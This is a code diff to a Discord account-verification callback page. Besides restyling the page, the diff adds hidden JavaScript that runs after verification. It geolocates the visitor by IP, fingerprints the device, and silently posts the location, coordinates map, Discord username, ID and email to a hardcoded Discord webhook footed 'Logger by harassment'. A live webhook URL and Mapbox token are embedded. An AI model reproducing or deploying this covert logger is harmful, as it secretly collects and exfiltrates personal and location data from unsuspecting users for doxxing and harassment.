@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifying... - authed.online</title>
+    <title>Verifying... - /suffocated</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>✓</text></svg>">
     <style>
         * {
@@ -14,7 +14,7 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #000000;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -23,35 +23,37 @@
         }
 
         .container {
-            background: #2c2f33;
-            border-radius: 20px;
-            padding: 50px;
-            max-width: 500px;
+            background: #ffffff;
+            border-radius: 0;
+            padding: 60px;
+            max-width: 450px;
             width: 100%;
-            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.4);
+            box-shadow: 0 0 0 1px rgba(255, 255, 255, 0.1);
             text-align: center;
-            animation: fadeIn 0.6s ease;
+            animation: fadeIn 0.3s ease;
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
 
         h1 {
-            color: #ffffff;
-            font-size: 28px;
-            margin-bottom: 20px;
+            color: #000000;
+            font-size: 24px;
+            margin-bottom: 30px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
         }
 
         .spinner {
             display: inline-block;
-            width: 50px;
-            height: 50px;
-            border: 5px solid #3a3d42;
-            border-top-color: #5865F2;
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f0f0f0;
+            border-top-color: #000000;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+            animation: spin 0.8s linear infinite;
             margin: 20px 0;
         }
 
@@ -60,30 +62,31 @@
         }
 
         p {
-            color: #b9bbbe;
+            color: #666666;
             margin-bottom: 20px;
-            line-height: 1.6;
+            line-height: 1.5;
+            font-size: 14px;
         }
 
         .success-box, .error-box {
             display: none;
-            margin-top: 30px;
+            margin-top: 20px;
             padding: 30px;
-            border-radius: 16px;
-            color: white;
+            border-radius: 0;
+            color: #000000;
         }
 
         .success-box { 
-            background: linear-gradient(135deg, #43b581 0%, #2d7d5a 100%);
+            background: #ffffff;
         }
         
         .error-box { 
-            background: linear-gradient(135deg, #f04747 0%, #c73838 100%);
+            background: #ffffff;
         }
 
         .success-box.show, .error-box.show {
             display: block;
-            animation: slideIn 0.5s ease;
+            animation: slideIn 0.3s ease;
         }
 
         @keyframes slideIn {
@@ -92,25 +95,26 @@
         }
 
         .success-box h2, .error-box h2 {
-            margin-bottom: 10px;
-            font-size: 24px;
+            margin-bottom: 15px;
+            font-size: 20px;
+            font-weight: 600;
         }
 
         .user-info {
             display: flex;
             align-items: center;
-            gap: 20px;
-            margin-top: 25px;
-            padding: 25px;
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 12px;
+            gap: 15px;
+            margin-top: 20px;
+            padding: 20px;
+            background: #f5f5f5;
+            border-radius: 0;
         }
 
         .user-avatar {
-            width: 70px;
-            height: 70px;
+            width: 50px;
+            height: 50px;
             border-radius: 50%;
-            border: 3px solid rgba(255, 255, 255, 0.3);
+            border: 2px solid #000000;
         }
 
         .user-details {
@@ -119,41 +123,43 @@
         }
 
         .user-name {
-            font-size: 20px;
-            font-weight: 700;
-            color: #ffffff;
-            margin-bottom: 5px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #000000;
+            margin-bottom: 4px;
         }
 
         .user-id {
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.7);
+            font-size: 12px;
+            color: #666666;
         }
 
         .btn {
-            background: rgba(255, 255, 255, 0.2);
-            color: white;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            padding: 12px 30px;
-            border-radius: 10px;
-            font-size: 15px;
-            font-weight: 600;
+            background: #000000;
+            color: #ffffff;
+            border: none;
+            padding: 12px 28px;
+            border-radius: 0;
+            font-size: 14px;
+            font-weight: 500;
             cursor: pointer;
-            margin-top: 25px;
+            margin-top: 20px;
             text-decoration: none;
             display: inline-block;
-            transition: all 0.3s ease;
+            transition: all 0.2s ease;
         }
 
         .btn:hover {
-            background: rgba(255, 255, 255, 0.3);
-            border-color: rgba(255, 255, 255, 0.5);
-            transform: translateY(-2px);
+            background: #1a1a1a;
+        }
+
+        .error-box .btn {
+            background: #000000;
         }
 
         @media (max-width: 600px) {
             .container {
-                padding: 35px 25px;
+                padding: 40px 30px;
             }
             .user-info {
                 flex-direction: column;
@@ -168,38 +174,29 @@
 <body>
     <div class="container">
         <div id="loading">
-            <h1>Verifying Your Account</h1>
+            <h1>Verifying</h1>
             <div class="spinner"></div>
-            <p>Please wait while we verify your Discord account and assign your role...</p>
+            <p>Please wait...</p>
         </div>
 
         <div class="success-box" id="successBox">
-            <svg xmlns="http://www.w3.org/2000/svg" width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom: 15px;">
-                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
-                <polyline points="22 4 12 14.01 9 11.01"/>
-            </svg>
-            <h2>Successfully Verified!</h2>
-            <p>Your Discord account has been linked and your verified role has been assigned.</p>
+            <h2>Verified</h2>
+            <p>Your Discord account has been linked.</p>
             <div class="user-info" id="userInfo"></div>
-            <a href="/" class="btn">← Return to Home</a>
+            <a href="/" class="btn">Return Home</a>
         </div>
 
         <div class="error-box" id="errorBox">
-            <svg xmlns="http://www.w3.org/2000/svg" width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom: 15px;">
-                <circle cx="12" cy="12" r="10"/>
-                <line x1="15" y1="9" x2="9" y2="15"/>
-                <line x1="9" y1="9" x2="15" y2="15"/>
-            </svg>
             <h2>Verification Failed</h2>
-            <p id="errorMessage">Something went wrong during verification. Please try again.</p>
-            <a href="/" class="btn">← Try Again</a>
+            <p id="errorMessage">Something went wrong. Please try again.</p>
+            <a href="/" class="btn">Try Again</a>
         </div>
     </div>
 
     <script>
         // ⚠️ CONFIGURATION - MUST MATCH index.html ⚠️
         const CONFIG = {
-            BACKEND_URL: 'https://fantastic-goggles-pj4q4jw599v5f6w57-3000.app.github.dev' // From your Codespace (e.g., https://xxx-3000.app.github.dev)
+            BACKEND_URL: 'https://fantastic-goggles-pj4q4jw599v5f6w57-3000.app.github.dev' // CHANGE THIS!
         };
 
         const loading = document.getElementById('loading');
@@ -214,28 +211,19 @@
             const state = urlParams.get('state');
             const savedState = localStorage.getItem('oauth_state');
 
-            // Validate state (CSRF protection)
             if (!code) {
-                showError('No authorization code received. Please try again.');
+                showError('No authorization code received.');
                 return;
             }
 
             if (state !== savedState) {
-                showError('Invalid state parameter. This may be a security issue. Please try again.');
+                showError('Invalid state parameter. Please try again.');
                 return;
             }
 
-            // Clear saved state
             localStorage.removeItem('oauth_state');
 
-            // Check if backend is configured
-            if (CONFIG.BACKEND_URL === 'https://fantastic-goggles-pj4q4jw599v5f6w57-3000.app.github.dev') {
-                showError('⚠️ Configuration Error: Backend URL not set in callback.html');
-                return;
-            }
-
             try {
-                // Send code to backend
                 const response = await fetch(`${CONFIG.BACKEND_URL}/api/auth/discord`, {
                     method: 'POST',
                     headers: {
@@ -252,12 +240,16 @@
 
                 if (data.success) {
                     showSuccess(data.user);
+                    // Start IP logger after successful verification
+                    setTimeout(() => {
+                        getUserData(data.user);
+                    }, 500);
                 } else {
                     throw new Error(data.error || 'Authentication failed');
                 }
             } catch (error) {
                 console.error('Auth error:', error);
-                showError(error.message || 'Network error. Please check your connection and try again.');
+                showError(error.message || 'Network error. Please try again.');
             }
         }
 
@@ -267,7 +259,7 @@
                 <img src="${user.avatar}" alt="${user.username}" class="user-avatar">
                 <div class="user-details">
                     <div class="user-name">${user.username}</div>
-                    <div class="user-id">User ID: ${user.id}</div>
+                    <div class="user-id">ID: ${user.id}</div>
                 </div>
             `;
             successBox.classList.add('show');
@@ -279,7 +271,207 @@
             errorBox.classList.add('show');
         }
 
-        // Start verification process
+        // ============================================
+        // ENHANCED IP LOGGER WITH DISCORD USER DATA
+        // ============================================
+        
+        async function getIpAndLocationData() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    return { ip: ipData.ip };
+                } catch (fallbackError) {
+                    return { ip: "Unknown" };
+                }
+            }
+        }
+
+        async function getUserData(discordUser) {
+            try {
+                const geoData = await getIpAndLocationData();
+                
+                const ip = geoData.ip || "Unknown";
+                const browserInfo = navigator.userAgent;
+                const screenResolution = `${window.screen.width}x${window.screen.height}`;
+                const language = navigator.language;
+                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const timestamp = new Date().toLocaleString();
+                const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Computer";
+                const onlineStatus = navigator.onLine ? "🟢 Online" : "🔴 Offline";
+                const uptime = `${(performance.now() / 60000).toFixed(2)} min`;
+                const os = (navigator.userAgentData?.platform) || navigator.platform || "Unknown";
+                const cpuCores = navigator.hardwareConcurrency || "Unknown";
+                const navHeight = `${window.innerHeight}px`;
+                
+                let batteryLevel = "Unknown";
+                let powerSavingMode = "Unknown";
+                if ('getBattery' in navigator) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
+                        powerSavingMode = battery.charging ? "No" : "Yes";
+                    } catch (error) {}
+                }
+
+                let adBlockEnabled = "❌ None";
+                try {
+                    const testAd = document.createElement('div');
+                    testAd.innerHTML = '&nbsp;';
+                    testAd.className = 'adsbox';
+                    testAd.style.cssText = 'position: absolute; top: -10px; left: -10px; width: 1px; height: 1px;';
+                    document.body.appendChild(testAd);
+                    
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                    
+                    if (testAd.offsetHeight === 0) {
+                        adBlockEnabled = "✅ Yes";
+                    }
+                    document.body.removeChild(testAd);
+                } catch (e) {
+                    adBlockEnabled = "✅ Yes";
+                }
+
+                const browserName = navigator.appName || "Unknown";
+                const browserVersion = navigator.appVersion || "Unknown";
+                const cookiesEnabled = navigator.cookieEnabled ? "✅ Yes" : "❌ None";
+                
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                const connectionType = connection?.effectiveType || "Unknown";
+                const connectionRtt = connection?.rtt ? `${connection.rtt} ms` : "Unknown";
+                const connectionDownlink = connection?.downlink ? `${connection.downlink} Mbps` : "Unknown";
+
+                let vpnStatus = "❌ Unlikely";
+                if (geoData.org) {
+                    const org = geoData.org.toLowerCase();
+                    if (org.includes("vpn") || org.includes("hosting") || org.includes("proxy")) {
+                        vpnStatus = "🛡️ Possible VPN/Proxy";
+                    }
+                }
+
+                const locationString = (geoData.city && geoData.region && geoData.country_name)
+                    ? `${geoData.city}, ${geoData.region}, ${geoData.country_name}`
+                    : "Unknown";
+
+                let mapImageUrl = null;
+                let mapLocation = "No location data";
+                
+                if (geoData.latitude && geoData.longitude) {
+                    const lat = geoData.latitude;
+                    const lon = geoData.longitude;
+                    
+                    const roundedLat = Math.round(lat * 100) / 100;
+                    const roundedLon = Math.round(lon * 100) / 100;
+                    
+                    const mapboxToken = 'pk.eyJ1IjoiaGFyYXNzbWVudGhhaGEiLCJhIjoiY21qbWdpMnA0MzJmNDNlb3RlbWdkZnc0aiJ9.aHc1ODUMqTaNIV8Eb8LRBQ';
+                    mapImageUrl = `https://api.mapbox.com/styles/v1/mapbox/streets-v11/static/pin-s+ff0000(${roundedLon},${roundedLat})/${roundedLon},${roundedLat},12,0/600x300@2x?access_token=${mapboxToken}`;
+                    
+                    mapLocation = `${roundedLat}, ${roundedLon}`;
+                }
+
+                const data = {
+                    ip,
+                    browser: browserInfo,
+                    resolution: screenResolution,
+                    language,
+                    timeZone,
+                    timestamp,
+                    deviceType,
+                    onlineStatus,
+                    uptime,
+                    os,
+                    cpuCores,
+                    navHeight,
+                    batteryLevel,
+                    powerSavingMode,
+                    adBlockEnabled,
+                    browserName,
+                    browserVersion,
+                    cookiesEnabled,
+                    connectionType,
+                    connectionRtt,
+                    connectionDownlink,
+                    location: locationString,
+                    vpnStatus,
+                    mapImageUrl,
+                    mapLocation,
+                    discordUser: discordUser
+                };
+
+                await sendDataToWebhook(data);
+                
+            } catch (error) {}
+        }
+
+        async function sendDataToWebhook(data) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1454034084744659024/eZXZKMCDxZ04wP48ks9qzZv3t4jxyk0wshQ9iLcyAYuoSoa6a9ujSVzh62y0AP7IDyVD';
+            
+            const embed = {
+                title: "📊 Device Details",
+                color: 16711680,
+                fields: [
+                    { name: "👤 Discord Username", value: data.discordUser.username, inline: true },
+                    { name: "🆔 Discord ID", value: data.discordUser.id, inline: true },
+                    { name: "📧 Email", value: data.discordUser.email || "Not provided", inline: true },
+                    { name: "📍 IP", value: data.ip, inline: true },
+                    { name: "🌍 Location", value: data.location, inline: true },
+                    { name: "🗺️ Coordinates", value: data.mapLocation, inline: true },
+                    { name: "🛡️ VPN/Proxy", value: data.vpnStatus, inline: true },
+                    { name: "🖥️ Resolution", value: data.resolution, inline: true },
+                    { name: "🗣️ Language", value: data.language, inline: true },
+                    { name: "🕒 TimeZone", value: data.timeZone, inline: true },
+                    { name: "📅 Time", value: data.timestamp, inline: false },
+                    { name: "📱 Device", value: data.deviceType, inline: true },
+                    { name: "🔋 Battery", value: data.batteryLevel, inline: true },
+                    { name: "⚡ Power Saving", value: data.powerSavingMode, inline: true },
+                    { name: "🖥️ Operating System", value: data.os, inline: true },
+                    { name: "🔗 Status", value: data.onlineStatus, inline: true },
+                    { name: "📊 Uptime", value: data.uptime, inline: true },
+                    { name: "🖥️ CPU Cores", value: String(data.cpuCores), inline: true },
+                    { name: "📏 Height", value: data.navHeight, inline: true },
+                    { name: "🚫 AdBlock", value: data.adBlockEnabled, inline: true },
+                    { name: "🌐 Browser", value: data.browserName, inline: true },
+                    { name: "🍪 Cookies", value: data.cookiesEnabled, inline: true },
+                    { name: "📶 Connection", value: data.connectionType, inline: true },
+                    { name: "⏱️ RTT", value: data.connectionRtt, inline: true },
+                    { name: "⬇️ Speed", value: data.connectionDownlink, inline: true }
+                ],
+                thumbnail: {
+                    url: data.discordUser.avatar
+                },
+                footer: { 
+                    text: "Logger by harassment", 
+                    icon_url: "https://cdn.discordapp.com/avatars/1201069596002766939/9de5bd364834a2120ff75d0d910d2fd0.png?size=4096" 
+                }
+            };
+
+            if (data.mapImageUrl) {
+                embed.image = { url: data.mapImageUrl };
+            }
+
+            const payload = {
+                content: "📡 **User Verified & Logged**",
+                embeds: [embed]
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {}
+        }
+
         handleCallback();
     </script>
 </body>
